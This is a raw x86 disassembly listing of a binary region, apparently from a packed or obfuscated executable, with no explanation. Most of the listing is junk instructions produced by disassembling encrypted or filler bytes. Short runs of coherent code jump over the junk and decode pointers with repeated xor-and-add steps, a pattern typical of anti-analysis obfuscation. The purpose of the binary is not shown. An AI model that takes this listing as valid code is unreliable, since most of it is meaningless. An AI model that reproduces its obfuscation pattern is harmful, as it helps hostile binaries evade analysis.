  406575:	add    BYTE PTR [ecx+0x41075b1d],al
  40657b:	add    BYTE PTR [ecx+edi*2+0x458d0044],bl
  406582:	mov    BYTE PTR [eax-0x75],dl
  406585:	inc    ebp
  406586:	in     al,dx
  406587:	xor    eax,esi
  406589:	add    eax,edi
  40658b:	push   eax
  40658c:	mov    eax,DWORD PTR [ebp-0x10]
  40658f:	jmp    0x4066bb
  406594:	dec    edx
  406595:	add    bh,BYTE PTR [ebx]
  406597:	cmp    DWORD PTR [ebx-0x43],0x6a
  40659b:	fnsave [eax]
  40659d:	xchg   ebx,eax
  40659e:	mov    al,0xc5
  4065a0:	call   0x6a6495b7
  4065a5:	and    al,0x7c
  4065a7:	jl     0x4065b6
  4065a9:	jg     0x406627
  4065ab:	jl     0x406629
  4065ad:	popa   
  4065ae:	sub    eax,DWORD PTR ds:0x6149eddf
  4065b4:	sub    eax,0x375453b7
  4065b9:	in     al,0x97
  4065bb:	jg     0x406571
  4065bd:	lods   eax,DWORD PTR ds:[esi]
  4065be:	or     bl,BYTE PTR [ebx]
  4065c0:	and    DWORD PTR [ecx],ecx
  4065c2:	popa   
  4065c3:	mov    ebp,0x444cc11b
  4065c8:	retf   
  4065c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065ca:	mov    esp,0x11221969
  4065cf:	sbb    BYTE PTR [edi-0x30],cl
  4065d2:	mov    DWORD PTR [edx-0x56],ebp
  4065d5:	inc    eax
  4065d6:	lock fsubr st,st(7)
  4065d9:	xor    DWORD PTR ds:0xeab30055,0xffffffd9
  4065e0:	mov    esp,DWORD PTR [esi-0x33]
  4065e3:	pop    ebp
  4065e4:	lods   eax,DWORD PTR ds:[esi]
  4065e5:	sbb    DWORD PTR [ebx],edx
  4065e7:	xlat   BYTE PTR ds:[ebx]
  4065e8:	cmp    al,0xf
  4065ea:	repnz sub BYTE PTR ds:0x1af71c83,0x87
  4065f2:	jmp    edi
  4065f4:	sbb    al,0x6d
  4065f6:	das    
  4065f7:	push   es
  4065f8:	std    
  4065f9:	imul   edi,ebp,0xc2d9a75
  4065ff:	push   0xffffffd1
  406601:	sahf   
  406602:	jecxz  0x40665a
  406604:	fbld   TBYTE PTR gs:[ebx+ebp*4]
  406608:	pop    ecx
  406609:	stc    
  40660a:	mov    ds:0xab17d0c5,eax
  40660f:	xchg   esi,eax
  406610:	or     DWORD PTR [esi],edi
  406612:	pop    ebx
  406613:	ror    DWORD PTR [ebx+ebp*1+0x2a5b5b75],1
  40661a:	xchg   ebp,eax
  40661b:	imul   ebp,DWORD PTR [ebx-0x4a],0x62c7cccf
  406622:	jo     0x406690
  406624:	cmp    DWORD PTR [ebp-0x7e],ecx
  406627:	lds    edx,FWORD PTR [ecx]
  406629:	push   cs
  40662a:	rcl    DWORD PTR [ecx],0xb7
  40662d:	dec    esi
  40662e:	(bad)  
  40662f:	loopne 0x406671
  406631:	cmp    DWORD PTR [esi+eiz*4+0x33],ebx
  406635:	xor    eax,0x75cfef3
  40663a:	mov    dl,0x31
  40663c:	jno    0x4065df
  40663e:	fs lock add al,0xe1
  406642:	mov    bh,0xf9
  406644:	xor    DWORD PTR [eax-0x22],esp
  406647:	and    cl,bl
  406649:	or     ebx,ebx
  40664b:	adc    BYTE PTR [esi-0x23],dh
  40664e:	out    0x21,eax
  406650:	sub    DWORD PTR [eax+0x1407b3e8],0xa9a904fe
  40665a:	fcom   QWORD PTR [esi-0x2d]
  40665d:	nop
  40665e:	mul    BYTE PTR [ebx+0x3d49838c]
  406664:	inc    ecx
  406665:	dec    eax
  406666:	sbb    edx,DWORD PTR [eax]
  406668:	adc    edx,ebx
  40666a:	(bad)  
  40666c:	cmp    BYTE PTR [edx+0x22],bh
  40666f:	push   edx
  406670:	stc    
  406671:	or     al,0x3b
  406673:	shl    DWORD PTR [eax-0x394dc246],1
  406679:	sbb    ecx,DWORD PTR ds:0x653b834d
  40667f:	jge    0x4066d9
  406681:	push   eax
  406682:	out    0x7f,al
  406684:	sbb    al,0x9c
  406686:	jg     0x4066f4
  406688:	pop    esi
  406689:	out    dx,eax
  40668a:	ja     0x40667f
  40668c:	mov    ss,WORD PTR [ebp-0x28e52d5f]
  406692:	clc    
  406693:	pop    edx
  406694:	(bad)  
  406695:	scas   eax,DWORD PTR es:[edi]
  406696:	rcr    BYTE PTR [edi-0xd2c6083],1
  40669c:	inc    ebx
  40669d:	add    ebx,DWORD PTR [esi-0x33a4d0d2]
  4066a3:	not    edx
  4066a5:	jns    0x4066e8
  4066a7:	mov    ecx,0x629aaf78
  4066ac:	dec    edx
  4066ad:	mov    edx,0x4c99625a
  4066b2:	nop
  4066b3:	sub    DWORD PTR [edi+0x7eb66866],eax
  4066b9:	out    dx,eax
  4066ba:	mov    ecx,0xaa05
  4066bf:	add    BYTE PTR [eax-0x17],dl
  4066c2:	daa    
  4066c3:	add    DWORD PTR [eax],eax
  4066c5:	add    BYTE PTR [ebx],ch
  4066c7:	dec    esp
  4066c8:	into   
  4066c9:	hlt    
  4066ca:	jge    0x4066c2
  4066cc:	jge    0x406731
  4066ce:	fnstenv [edi-0x40bdb590]
  4066d4:	add    al,0x68
  4066d6:	jnp    0x4066ff
  4066d8:	jl     0x406756
  4066da:	or     eax,0xfc7c7c7f
  4066df:	and    DWORD PTR [ebp+0x4f57f74c],ecx
  4066e5:	rcl    BYTE PTR [ecx-0x37],cl
  4066e8:	dec    ebp
  4066e9:	dec    ebx
  4066ea:	cmp    edx,DWORD PTR [ebp-0x39]
  4066ed:	push   0xffffff81
  4066ef:	sub    al,0x3d
  4066f1:	jge    0x4066de
  4066f3:	xchg   esp,eax
  4066f4:	xchg   ebx,eax
  4066f5:	fdivr  st,st(2)
  4066f7:	dec    ebp
  4066f8:	sub    eax,0x2ed2de00
  4066fd:	ret    
  4066fe:	or     ecx,ebx
  406700:	scas   eax,DWORD PTR es:[edi]
  406701:	mov    ah,0xc
  406703:	retf   
  406704:	cmp    DWORD PTR [eax+0x1bfb6245],esp
  40670a:	fimul  DWORD PTR [esi+0x4fe9fb31]
  406710:	jle    0x406726
  406712:	jne    0x406753
  406714:	inc    esp
  406715:	mov    al,0x5b
  406717:	sbb    BYTE PTR [edi],bl
  406719:	mov    esi,0x9c62064b
  40671e:	out    0xbe,eax
  406720:	popa   
  406721:	int    0x9f
  406723:	retf   0x2859
  406726:	mov    dl,0x7d
  406728:	and    esp,esi
  40672a:	leave  
  40672b:	dec    ebx
  40672c:	and    eax,0x685356be
  406731:	push   ss
  406732:	dec    ebp
  406733:	mov    eax,ds:0x4e5e692c
  406738:	ss inc eax
  40673a:	mov    al,ds:0x7df925d7
  40673f:	sub    eax,0x60041738
  406744:	dec    edx
  406745:	cmp    eax,esi
  406747:	fs inc edx
  406749:	pop    esi
  40674a:	xchg   esp,eax
  40674b:	mov    ds:0xd186f35c,eax
  406750:	shr    DWORD PTR [edi-0x55],cl
  406753:	les    ebp,FWORD PTR ds:0xffe1ec0b
  406759:	mov    ebp,0x23409ed8
  40675e:	push   si
  406760:	push   cs
  406761:	or     BYTE PTR [esi],0xfb
  406764:	(bad)
  406767:	inc    ebp
  406768:	fbld   TBYTE PTR [ebp+0x608ce3f1]
  40676e:	mov    ds:0x3a349b6c,eax
  406773:	push   es
  406774:	jno    0x4067bd
  406776:	add    al,0x16
  406778:	into   
  406779:	std    
  40677a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40677b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40677c:	mov    dl,0x4f
  40677e:	loopne 0x406718
  406780:	inc    edi
  406781:	xor    bl,BYTE PTR [ebx-0x56f2a55e]
  406787:	cmp    DWORD PTR [esi],ecx
  406789:	jmp    0x8e39354d
  40678e:	adc    al,0xb6
  406790:	push   esi
  406791:	jae    0x4067bf
  406793:	push   ebx
  406794:	add    eax,0x1a6706dc
  406799:	and    bl,BYTE PTR [edi+0x66fed7df]
  40679f:	xchg   edi,eax
  4067a0:	pusha  
  4067a1:	inc    ebx
  4067a2:	into   
  4067a3:	jnp    0x40672e
  4067a5:	pop    edi
  4067a6:	pop    ebx
  4067a7:	mov    ah,0x89
  4067a9:	sub    edi,DWORD PTR [edi-0x69]
  4067ac:	jnp    0x406790
  4067ae:	fs xchg edi,eax
  4067b0:	mov    esp,DWORD PTR [ebp+0x752e46bf]
  4067b6:	pop    esi
  4067b7:	add    BYTE PTR [edi],0x75
  4067ba:	jns    0x406802
  4067bc:	and    esp,edi
  4067be:	mov    ebx,0x1429bc0d
  4067c3:	inc    eax
  4067c4:	ins    BYTE PTR es:[edi],dx
  4067c5:	push   cs
  4067c6:	repz mov ds:0xcc03a554,eax
  4067cc:	aad    0x11
  4067ce:	pushf  
  4067cf:	mov    gs,ecx
  4067d1:	inc    ebp
  4067d2:	faddp  st(1),st
  4067d4:	imul   esp
  4067d6:	in     al,0xf
  4067d8:	mov    edx,0x63ff19ce
  4067dd:	rdmsr  
  4067df:	cmp    esp,DWORD PTR [eax+0x48]
  4067e2:	mov    eax,ds:0xc10ad7cf
  4067e7:	enter  0xb336,0x94
  4067eb:	pop    ds
  4067ec:	xor    DWORD PTR [ebx-0x7f740fbb],ecx
  4067f2:	cwde   
  4067f3:	add    DWORD PTR [eax],eax
  4067f5:	add    cl,ch
  4067f7:	daa    
  4067f8:	add    DWORD PTR [eax],eax
  4067fa:	add    bl,dl
  4067fc:	jmp    0x799ac64d
  406801:	in     eax,0x6d
  406803:	adc    eax,0xb4a54fb4
  406808:	sti    
  406809:	push   edx
  40680a:	jecxz  0x406814
  40680c:	cmp    DWORD PTR [esp+edi*2+0xd],edi
  406810:	jg     0x40688e
  406812:	jl     0x40681b
  406814:	ins    BYTE PTR es:[edi],dx
  406815:	sub    al,0xb6
  406817:	and    BYTE PTR ds:0x303486ac,ch
  40681d:	lods   eax,DWORD PTR ds:[esi]
  40681e:	call   0x9dba:0x10872609
  406825:	mov    ebp,0x29f23dea
  40682a:	sub    ebx,ebx
  40682c:	psubsw mm7,mm0
  40682f:	or     edi,DWORD PTR [eax-0x73b44398]
  406835:	dec    eax
  406836:	repz btc DWORD PTR [eax],0x2a
  40683b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40683c:	nop
  40683d:	cdq    
  40683e:	bound  ecx,QWORD PTR [eax-0x3e0442aa]
  406844:	add    edi,DWORD PTR [ebx+0x2b7026fe]
  40684a:	loop   0x4068ad
  40684c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40684d:	fcomp  DWORD PTR [ebx-0x58c3115f]
  406853:	mov    al,0x23
  406855:	lahf   
  406856:	test   al,0x8f
  406858:	push   ecx
  406859:	add    eax,DWORD PTR [ebx]
  40685b:	mov    BYTE PTR ds:[esi-0x2],dl
  40685f:	in     eax,0x4
  406861:	and    eax,0x34d1095
  406866:	iret   
  406867:	adc    bh,BYTE PTR [ecx-0x21]
  40686a:	and    al,0x61
  40686c:	into   
  40686d:	mov    ecx,0x4865dfba
  406872:	mov    cl,0x2
  406874:	xchg   ebp,eax
  406875:	dec    eax
  406876:	jge    0x4068e0
  406878:	int3   
  406879:	xchg   edi,eax
  40687a:	imul   edx,DWORD PTR [ebp-0x47],0x3a577543
  406881:	out    dx,al
  406882:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  406884:	fs push ds
  406886:	or     al,0xfd
  406888:	push   cs
  406889:	mov    ebp,0xca407a4
  40688e:	dec    edx
  40688f:	xchg   bl,ah
  406891:	or     DWORD PTR [edx+0x78ef5818],ebp
  406897:	rol    DWORD PTR [ebp-0x2],cl
  40689a:	mov    ebp,0x2b7f623e
  40689f:	repnz imul esi,DWORD PTR [edx+eiz*2-0x1b],0x6914e43d
  4068a8:	add    BYTE PTR ds:0xef7a23aa,bl
  4068ae:	mov    bh,0x50
  4068b0:	xchg   ebx,eax
  4068b1:	fldcw  WORD PTR [ecx-0x767cd9f4]
  4068b7:	icebp  
  4068b8:	mov    dl,0xdd
  4068ba:	loop   0x4068e4
  4068bc:	stos   BYTE PTR es:[edi],al
  4068bd:	sub    eax,0xb4b5e274
  4068c2:	inc    eax
  4068c3:	scas   eax,DWORD PTR es:[edi]
  4068c4:	xchg   ebx,esi
  4068c6:	dec    edx
  4068c7:	cmp    al,ch
  4068c9:	jmp    0x4fb390fa
  4068ce:	nop
  4068cf:	enterw 0x477a,0x51
  4068d4:	cdq    
  4068d5:	inc    eax
  4068d6:	sub    BYTE PTR [esp+eax*4-0x376131d6],bl
  4068dd:	dec    ecx
  4068de:	mov    esp,0x19fa29f8
  4068e3:	mov    al,0x5d
  4068e5:	pusha  
  4068e6:	add    DWORD PTR [esi+0x6c5926ce],ebp
  4068ec:	or     al,0x99
  4068ee:	fcom   DWORD PTR [edx]
  4068f0:	sub    cl,cl
  4068f2:	jnp    0x40694c
  4068f4:	das    
  4068f5:	sub    eax,esi
  4068f7:	add    DWORD PTR [ebx+0x63ae7c95],esp
  4068fd:	scas   al,BYTE PTR es:[edi]
  4068fe:	leave  
  4068ff:	sbb    ecx,DWORD PTR [esi-0x69c27e23]
  406905:	xchg   esi,eax
  406906:	adc    esi,ebx
  406908:	les    ebx,FWORD PTR [eax]
  40690a:	dec    edx
  40690b:	inc    esi
  40690c:	int    0xe4
  40690e:	dec    edx
  40690f:	clc    
  406910:	mov    ebp,0xb3de6bf0
  406915:	or     DWORD PTR fs:[eax],ebx
  406918:	push   eax
  406919:	push   esp
  40691a:	repz and DWORD PTR [ebx+0x2c],esi
  40691e:	loop   0x40692a
  406920:	pusha  
  406921:	ret    
  406922:	push   DWORD PTR [eax]
  406924:	call   0x40101c
  406929:	mov    DWORD PTR [ebp-0x8],eax
  40692c:	cmp    DWORD PTR [ebp-0x8],0x0
  406930:	lea    eax,[ebp+0x4]
  406933:	mov    DWORD PTR [ebp-0x20],eax
  406936:	je     0x406fd6
  40693c:	lea    eax,[ebp-0x18]
  40693f:	push   eax
  406940:	mov    eax,DWORD PTR [ebp-0x2c]
  406943:	xor    eax,esi
  406945:	add    eax,edi
  406947:	push   eax
  406948:	mov    eax,DWORD PTR [ebp-0x1c]
  40694b:	xor    eax,esi
  40694d:	add    eax,edi
  40694f:	push   eax
  406950:	push   DWORD PTR [ebp-0x8]
  406953:	lea    eax,[ebp-0x78]
  406956:	push   eax
  406957:	push   DWORD PTR [ebp-0xc]
  40695a:	push   DWORD PTR [ebp-0x14]
  40695d:	call   0x4055ae
  406962:	test   eax,eax
  406964:	je     0x406abb
  40696a:	lea    eax,[ebp-0x78]
  40696d:	push   eax
  40696e:	mov    eax,DWORD PTR [ebp-0x14]
  406971:	xor    eax,esi
  406973:	add    eax,edi
  406975:	push   eax
  406976:	mov    eax,DWORD PTR [ebp-0x10]
  406979:	add    eax,0xee
  40697e:	push   eax
  40697f:	mov    eax,DWORD PTR [ebp-0x10]
  406982:	mov    eax,DWORD PTR [eax+0x198]
  406988:	push   DWORD PTR [eax]
  40698a:	jmp    0x406ab6
  40698f:	xor    BYTE PTR [ecx-0x12922c70],ch
  406995:	mov    bl,0xa9
  406997:	and    BYTE PTR [esi+eax*2-0x22],ch
  40699b:	sub    al,0x93
  40699d:	lahf   
  40699e:	sbb    DWORD PTR [bx+si],edi
  4069a1:	jl     0x406a1f
  4069a3:	or     eax,0xad7c7c7f
  4069a8:	xchg   DWORD PTR [ecx],ebx
  4069aa:	test   al,0xe3
  4069ac:	jecxz  0x4069fb
  4069ae:	hlt    
  4069af:	(bad)  
  4069b2:	mov    DWORD PTR [esi+esi*4],eax
  4069b5:	(bad)  
  4069b6:	mov    ch,0x90
  4069b8:	shl    ebp,0x4d
  4069bb:	fnstsw WORD PTR [ebx-0x23]
  4069be:	pop    eax
  4069bf:	arpl   di,cx
  4069c1:	and    BYTE PTR [eax+ecx*4+0x5],bh
  4069c5:	push   ss
  4069c6:	(bad)  
  4069c7:	dec    ecx
  4069c8:	adc    esp,0xda808db7
  4069ce:	repnz push 0xbf87b302
  4069d4:	popf   
  4069d5:	jns    0x4069cc
  4069d7:	(bad)  
  4069d8:	js     0x406992
  4069da:	sbb    esi,DWORD PTR [ecx]
  4069dc:	jmp    0x406a1c
  4069de:	add    esp,ebp
  4069e0:	loop   0x40697b
  4069e2:	mov    bl,0x8c
  4069e4:	fisubr WORD PTR [edx]
  4069e6:	loope  0x4069c2
  4069e8:	sahf   
  4069e9:	fwait
  4069ea:	aam    0xb6
  4069ec:	cld    
  4069ed:	and    BYTE PTR [eax-0x47a1ee2c],dh
  4069f3:	jb     0x4069c6
  4069f5:	addr16 jle 0x4069ff
  4069f8:	sbb    BYTE PTR [esi-0x10009020],bh
  4069fe:	sub    al,cl
  406a00:	xor    DWORD PTR [eax],eax
  406a02:	ret    0x1766
  406a05:	sub    al,0x64
  406a07:	inc    edx
  406a08:	push   ds
  406a09:	int3   
  406a0a:	push   esp
  406a0b:	jne    0x406a3c
  406a0d:	test   BYTE PTR [ebp+0x76],dl
  406a10:	out    dx,al
  406a11:	add    al,0xeb
  406a13:	mov    edi,DWORD PTR [ecx-0x3b]
  406a16:	in     eax,0x9b
  406a18:	scas   eax,DWORD PTR es:[edi]
  406a19:	push   edi
  406a1a:	in     al,dx
  406a1b:	and    eax,0x9ad9944c
  406a20:	mov    ebp,0x541fed1a
  406a25:	ror    DWORD PTR [edi+edx*8-0x43],0xea
  406a2a:	push   ecx
  406a2b:	enter  0xb9e2,0x1f
  406a2f:	xchg   edi,eax
  406a31:	pop    eax
  406a32:	call   DWORD PTR [edi+ebx*8+0x4b9779b1]
  406a39:	cs add eax,0x15e58cb5
  406a3f:	aam    0x83
  406a41:	mov    ds,WORD PTR [eax-0x69]
  406a44:	mov    cl,0xfa
  406a46:	outs   dx,DWORD PTR ds:[esi]
  406a47:	cld    
  406a48:	xor    al,0x42
  406a4a:	push   ss
  406a4b:	sub    eax,edx
  406a4d:	cld    
  406a4e:	push   ebx
  406a4f:	mov    eax,ds:0x2a97edc3
  406a54:	pop    edi
  406a55:	pop    ecx
  406a56:	ret    0x2fd1
  406a59:	repnz push ss
  406a5b:	shl    BYTE PTR [esp+ebp*8-0x4b3bb645],0x41
  406a63:	mov    cl,0xc8
  406a65:	(bad)  
  406a66:	mov    eax,0x9f8e80a1
  406a6b:	xor    ecx,ebx
  406a6d:	iret   
  406a6e:	inc    eax
  406a6f:	xchg   DWORD PTR [eax-0x2b7c1e4d],esp
  406a75:	sub    BYTE PTR [ecx+ebp*1-0x1c1b609b],al
  406a7c:	add    ecx,edx
  406a7e:	jp     0x406aaf
  406a80:	adc    BYTE PTR [ebx],dl
  406a82:	cli    
  406a83:	xor    DWORD PTR [esi],0xffffff9a
  406a86:	scas   eax,DWORD PTR es:[edi]
  406a87:	cmp    bh,BYTE PTR [eax]
  406a89:	inc    esp
  406a8a:	pop    es
  406a8b:	int3   
  406a8c:	call   0x8987:0xeb0f9126
  406a93:	icebp  
  406a94:	jmp    0xca1cb34b
  406a99:	stos   WORD PTR es:[edi],ax
  406a9b:	add    eax,0xc3c3e839
  406aa1:	sar    DWORD PTR [ebx+ecx*1],cl
  406aa4:	jl     0x406a5b
  406aa6:	pop    ecx
  406aa7:	push   ebx
  406aa8:	push   cs
  406aa9:	retf   0x5cd5
  406aac:	or     al,0xd2
  406aae:	pop    esi
  406aaf:	repnz (bad) 
  406ab1:	es test ah,bl
  406ab4:	xlat   BYTE PTR ds:[ebx]
  406ab5:	out    dx,eax
  406ab6:	call   0x40101c
  406abb:	mov    ecx,DWORD PTR [ebp-0x1c]
  406abe:	xor    ecx,esi
  406ac0:	mov    eax,0xffcd8d62
  406ac5:	sub    eax,ecx
  406ac7:	jmp    0x406bf3
  406acc:	or     al,0x53
  406ace:	and    al,0x43
  406ad0:	jnp    0x406b2d
  406ad2:	jnp    0x406b27
  406ad4:	gs ins DWORD PTR es:[edi],dx
  406ad6:	push   esp
  406ad7:	and    BYTE PTR [edx-0x54],dh
  406ada:	fcomp  DWORD PTR [esi+0x7c7c3b16]
  406ae0:	or     eax,0x427c7c7f
  406ae5:	jmp    0x406b38
  406ae7:	fdivr  DWORD PTR [ebx+0x6c0801d]
  406aed:	jmp    0x406af0
  406aef:	mov    esp,DWORD PTR [ebx]
  406af1:	aad    0x6b
  406af3:	push   0x5578907c
  406af8:	xchg   WORD PTR [ecx],bx
  406afb:	jbe    0x406ae9
  406afd:	enter  0x31f6,0xcb
  406b01:	mov    ds,WORD PTR [edx+0x19]
  406b04:	out    0xe4,al
  406b06:	add    eax,0xac687d20
  406b0b:	jnp    0x406b3d
  406b0d:	into   
  406b0e:	mov    ds:0x4f01cfb2,eax
  406b13:	das    
  406b14:	jmp    0x406ac5
  406b16:	enter  0xe42c,0xc0
  406b1a:	sbb    BYTE PTR [esp+ebp*2-0x9],dh
  406b1e:	out    0xc0,al
  406b20:	jnp    0x406b72
  406b22:	test   BYTE PTR ds:0x314ad9c8,0xb4
  406b29:	setg   BYTE PTR [edi+0x153eb32d]
  406b30:	push   edx
  406b31:	xor    ecx,ecx
  406b33:	jmp    0xec7beac
  406b38:	or     ebx,ebx
  406b3a:	inc    ebx
  406b3b:	stos   BYTE PTR es:[edi],al
  406b3c:	mov    ds:0xd52fb893,eax
  406b41:	ror    dl,cl
  406b43:	mov    gs,WORD PTR [eax+0x1c]
  406b46:	enter  0x9d7f,0x49
  406b4a:	aaa    
  406b4b:	lock nop
  406b4d:	xchg   edx,eax
  406b4e:	dec    edi
  406b4f:	pop    ebx
  406b50:	dec    edi
  406b51:	xor    eax,0x637becb7
  406b56:	and    eax,0x8900e66d
  406b5b:	out    0x82,al
  406b5d:	push   cs
  406b5e:	loopne 0x406b7a
  406b60:	ret    0xd113
  406b63:	jmp    DWORD PTR [edx-0x12523554]
  406b69:	xlat   BYTE PTR ds:[ebx]
  406b6a:	rcr    dh,1
  406b6c:	add    eax,0x9c604097
  406b71:	shl    dl,cl
  406b73:	pop    esp
  406b74:	cmc    
  406b75:	in     al,0x4
  406b77:	aam    0xc6
  406b79:	or     BYTE PTR [ebx+0x59],al
  406b7c:	mov    dh,0x79
  406b7e:	hlt    
  406b7f:	(bad)  
  406b80:	cmc    
  406b81:	xchg   esi,eax
  406b82:	jge    0x406b12
  406b84:	(bad)  
  406b86:	and    DWORD PTR [ecx],eax
  406b88:	xlat   BYTE PTR ds:[ebx]
  406b89:	mov    eax,DWORD PTR [ebx]
  406b8b:	adc    eax,0x13fc79e2
  406b90:	jmp    0xd0e8:0xc062ce2b
  406b97:	ss cmc 
  406b99:	dec    BYTE PTR [edi+0x6a]
  406b9c:	push   ds
  406b9d:	sbb    dl,BYTE PTR [ebp+0x37e2c27b]
  406ba3:	sahf   
  406ba4:	cmc    
  406ba5:	stos   BYTE PTR es:[edi],al
  406ba6:	loop   0x406b36
  406ba8:	xor    bh,al
  406baa:	inc    ebp
  406bab:	ss aam 0x8e
  406bae:	punpckhwd mm0,QWORD PTR [esp+0x44ca9097]
  406bb6:	sbb    eax,0x7153e57c
  406bbb:	outs   dx,DWORD PTR ds:[esi]
  406bbc:	mov    edx,0x73606137
  406bc1:	adc    ah,BYTE PTR [eax-0x2ecb2960]
  406bc7:	clc    
  406bc8:	in     al,0x5e
  406bca:	pop    edx
  406bcb:	ret    0x8e0c
  406bce:	jp     0x406ba8
  406bd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bd1:	or     eax,0xcca6949
  406bd6:	dec    esi
  406bd7:	lods   eax,DWORD PTR ds:[esi]
  406bd8:	retf   0xbf27
  406bdb:	lods   eax,DWORD PTR ds:[esi]
  406bdc:	in     eax,dx
  406bdd:	mov    dl,0x85
  406bdf:	loope  0x406b89
  406be1:	mov    bh,0x41
  406be3:	jecxz  0x406c58
  406be5:	sbb    cl,bl
  406be7:	clc    
  406be8:	mov    esi,0x74b019a7
  406bed:	fcmovne st,st(2)
  406bef:	mov    ds:0x2b25c5fc,al
  406bf4:	inc    ebp
  406bf5:	clc    
  406bf6:	mov    ecx,DWORD PTR [ebp-0x30]
  406bf9:	add    ecx,eax
  406bfb:	jmp    0x406d27
  406c00:	xchg   ebp,eax
  406c01:	(bad)  
  406c02:	out    0x14,eax
  406c04:	std    
  406c05:	push   esp
  406c06:	gs popf 
  406c08:	repz mov al,ds:0x24e49e75
  406c0e:	push   0x8
  406c10:	daa    
  406c11:	cmp    bh,BYTE PTR [esp+edi*2+0xd]
  406c15:	jg     0x406c93
  406c17:	jl     0x406bc3
  406c19:	inc    esp
  406c1a:	push   0xc0075a96
  406c1f:	in     al,0x70
  406c21:	loope  0x406ca2
  406c23:	test   eax,0x41632c38
  406c28:	mov    ebp,0x2e3e5282
  406c2d:	sti    
  406c2e:	(bad)  
  406c2f:	jge    0x406cad
  406c31:	jne    0x406c02
  406c33:	sub    eax,0xc38f6896
  406c38:	xchg   ebx,eax
  406c39:	xor    edi,DWORD PTR [edx+ecx*4-0xb]
  406c3d:	fcomip st,st(3)
  406c3f:	push   edi
  406c41:	push   esi
  406c42:	lods   al,BYTE PTR ds:[esi]
  406c43:	lahf   
  406c44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c45:	mov    eax,0xa44de878
  406c4a:	mov    bh,0xa
  406c4c:	lds    esp,FWORD PTR [eax]
  406c4e:	scas   al,BYTE PTR es:[edi]
  406c4f:	mov    cl,0x7b
  406c51:	sbb    DWORD PTR [ecx-0x4d],esi
  406c54:	pushf  
  406c55:	out    0x3b,al
  406c57:	adc    al,0x59
  406c59:	les    esp,FWORD PTR [esi+0x7ed502a]
  406c5f:	lahf   
  406c60:	or     al,0x94
  406c62:	mov    esp,0x2dafb455
  406c67:	das    
  406c68:	retf   0xd88c
  406c6b:	sub    BYTE PTR [esi-0x7d],bh
  406c6e:	call   0x56fa:0xa86c3d91
  406c75:	test   eax,0x3da63835
  406c7a:	cli    
  406c7b:	pop    esp
  406c7c:	repnz repnz cli 
  406c7f:	push   esp
  406c80:	pmullw mm6,QWORD PTR [esi+0x2]
  406c84:	xchg   dl,al
  406c86:	sbb    eax,0x6adfe65d
  406c8b:	out    dx,eax
  406c8c:	dec    ebx
  406c8d:	inc    esi
  406c8e:	jmp    0xb081:0x5ace5cc7
  406c95:	leave  
  406c96:	iret   
  406c97:	sbb    cl,al
  406c99:	sub    esi,esi
  406c9b:	add    ch,BYTE PTR [eax]
  406c9d:	cli    
  406c9e:	cmp    esp,DWORD PTR [si-0x246e]
  406ca3:	xchg   BYTE PTR [esi],dl
  406ca5:	xchg   BYTE PTR [edi],ch
  406ca7:	jno    0x406c45
  406ca9:	mov    ebx,0x4d1c2b7d
  406cae:	addr16 std 
  406cb0:	mov    esp,0x4fd44714
  406cb5:	pop    ebp
  406cb6:	pushf  
  406cb7:	popf   
  406cb8:	pop    edx
  406cb9:	xor    BYTE PTR [edi-0x3],cl
  406cbc:	dec    edx
  406cbd:	jae    0x406cd1
  406cbf:	add    BYTE PTR [ebx+0xd],ah
  406cc2:	clc    
  406cc3:	(bad)  
  406cc4:	mov    eax,0xb8f55feb
  406cc9:	xchg   ecx,eax
  406cca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ccb:	lods   al,BYTE PTR ds:[esi]
  406ccc:	stos   DWORD PTR es:[edi],eax
  406ccd:	inc    edx
  406cce:	dec    eax
  406ccf:	add    bl,dh
  406cd1:	hlt    
  406cd2:	shl    BYTE PTR [edi],1
  406cd4:	jecxz  0x406cd2
  406cd6:	cld    
  406cd7:	loop   0x406c66
  406cd9:	ror    DWORD PTR [eax-0x42264437],cl
  406cdf:	push   cs
  406ce0:	adc    al,0x30
  406ce2:	or     al,0xb0
  406ce4:	cmc    
  406ce5:	inc    BYTE PTR [ebp+eiz*8+0xc88694b]
  406cec:	and    eax,0x21353c18
  406cf1:	mov    dl,0xff
  406cf3:	adc    eax,0x12cb5d21
  406cf8:	inc    eax
  406cf9:	nop
  406cfa:	nop
  406cfb:	(bad)  
  406cfc:	std    
  406cfd:	dec    ebx
  406cfe:	mov    BYTE PTR [ebx+0x37465801],0xb4
  406d05:	(bad)  
  406d06:	push   ebp
  406d07:	jp     0x406d13
  406d09:	jae    0x406cfe
  406d0b:	or     DWORD PTR [edx-0x6f2f654b],esi
  406d11:	mov    al,0x3
  406d13:	rol    dl,cl
  406d15:	int3   
  406d16:	and    al,0x84
  406d18:	jns    0x406ced
  406d1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d1b:	mov    ah,0xa4
  406d1d:	push   eax
  406d1e:	stc    
  406d1f:	stos   BYTE PTR es:[edi],al
  406d20:	push   cs
  406d21:	loopne 0x406cf6
  406d23:	sbb    esp,DWORD PTR [edx]
  406d25:	xchg   esi,eax
  406d26:	push   edx
  406d27:	mov    eax,DWORD PTR [ebp-0x8]
  406d2a:	mov    DWORD PTR [eax+0x1],ecx
  406d2d:	mov    al,BYTE PTR [ebp-0x1]
  406d30:	mov    ecx,DWORD PTR [ebp-0x8]
  406d33:	xor    al,0x49
  406d35:	sub    al,0x35
  406d37:	mov    BYTE PTR [ecx],al
  406d39:	lea    eax,[ebp-0x8]
  406d3c:	inc    BYTE PTR [eax]
  406d3e:	inc    eax
  406d3f:	push   eax
  406d40:	pop    ecx
  406d41:	dec    ecx
  406d42:	xchg   ecx,edx
  406d44:	dec    BYTE PTR [edx]
  406d46:	push   DWORD PTR [ebp-0x10]
  406d49:	mov    eax,ds:0x44425c
  406d4e:	mov    eax,DWORD PTR [eax]
  406d50:	push   DWORD PTR [eax]
  406d52:	lea    eax,ds:0x444278
  406d58:	jmp    0x406e84
  406d5d:	scas   eax,DWORD PTR es:[edi]
  406d5e:	stos   DWORD PTR es:[edi],eax
  406d5f:	fs pop ds
  406d61:	js     0x406d46
